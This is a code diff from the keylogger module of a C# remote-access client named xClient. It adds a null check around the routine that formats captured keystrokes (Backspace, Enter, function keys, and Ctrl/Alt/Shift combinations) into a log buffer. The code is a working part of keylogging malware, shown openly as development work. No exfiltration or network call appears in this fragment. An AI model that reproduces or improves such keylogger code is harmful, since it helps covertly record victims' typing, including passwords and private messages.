@@ -174,65 +174,68 @@ namespace xClient.Core.Keylogger
             _keyBuffer.CopyTo(keybuffer);
             foreach (var k in keybuffer)
             {
-                switch (k.Value)
+                if (k != null)
                 {
-                    case 8:
-                        _logFileBuffer.Append(HighlightSpecialKey("Back"));
-                        break;
-                    case 9:
-                        _logFileBuffer.Append(HighlightSpecialKey("Tab"));
-                        break;
-                    case 13:
-                        _logFileBuffer.Append(HighlightSpecialKey("Enter"));
-                        break;
-                    case 32:
-                        _logFileBuffer.Append(" ");
-                        break;
-                    case 46:
-                        _logFileBuffer.Append(HighlightSpecialKey("Del"));
-                        break;
-                    case 91:
-                    case 92:
-                        _logFileBuffer.Append(HighlightSpecialKey("Win"));
-                        break;
-                    case 112:
-                    case 113:
-                    case 114:
-                    case 115:
-                    case 116:
-                    case 117:
-                    case 118:
-                    case 119:
-                    case 120:
-                    case 121:
-                    case 122:
-                        _logFileBuffer.Append(HighlightSpecialKey("F" + (k.Value - 111)));
-                        break;
-                    default:
-                        if (_enumValues.Contains(k.Value))
-                        {
-                            if (k.AltKey && k.ControlKey && k.ShiftKey)
+                    switch (k.Value)
+                    {
+                        case 8:
+                            _logFileBuffer.Append(HighlightSpecialKey("Back"));
+                            break;
+                        case 9:
+                            _logFileBuffer.Append(HighlightSpecialKey("Tab"));
+                            break;
+                        case 13:
+                            _logFileBuffer.Append(HighlightSpecialKey("Enter"));
+                            break;
+                        case 32:
+                            _logFileBuffer.Append(" ");
+                            break;
+                        case 46:
+                            _logFileBuffer.Append(HighlightSpecialKey("Del"));
+                            break;
+                        case 91:
+                        case 92:
+                            _logFileBuffer.Append(HighlightSpecialKey("Win"));
+                            break;
+                        case 112:
+                        case 113:
+                        case 114:
+                        case 115:
+                        case 116:
+                        case 117:
+                        case 118:
+                        case 119:
+                        case 120:
+                        case 121:
+                        case 122:
+                            _logFileBuffer.Append(HighlightSpecialKey("F" + (k.Value - 111)));
+                            break;
+                        default:
+                            if (_enumValues.Contains(k.Value))
                             {
-                                _logFileBuffer.Append(HighlightSpecialKey("SHIFT-CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
+                                if (k.AltKey && k.ControlKey && k.ShiftKey)
+                                {
+                                    _logFileBuffer.Append(HighlightSpecialKey("SHIFT-CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
+                                }
+                                else if (k.AltKey && k.ControlKey && !k.ShiftKey)
+                                {
+                                    _logFileBuffer.Append(HighlightSpecialKey("CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
+                                }
+                                else if (k.AltKey && !k.ControlKey)
+                                {
+                                    _logFileBuffer.Append(HighlightSpecialKey("ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
+                                }
+                                else if (k.ControlKey && !k.AltKey)
+                                {
+                                    _logFileBuffer.Append(HighlightSpecialKey("CTRL-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
+                                }
+                                else
+                                {
+                                    _logFileBuffer.Append(FromKeys(k.Value, k.ShiftKey, k.CapsLock));
+                                }
                             }
-                            else if (k.AltKey && k.ControlKey && !k.ShiftKey)
-                            {
-                                _logFileBuffer.Append(HighlightSpecialKey("CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
-                            }
-                            else if (k.AltKey && !k.ControlKey)
-                            {
-                                _logFileBuffer.Append(HighlightSpecialKey("ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
-                            }
-                            else if (k.ControlKey && !k.AltKey)
-                            {
-                                _logFileBuffer.Append(HighlightSpecialKey("CTRL-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
-                            }
-                            else
-                            {
-                                _logFileBuffer.Append(FromKeys(k.Value, k.ShiftKey, k.CapsLock));
-                            }
-                        }
-                        break;
+                            break;
+                    }
                 }
                 j++;
             }
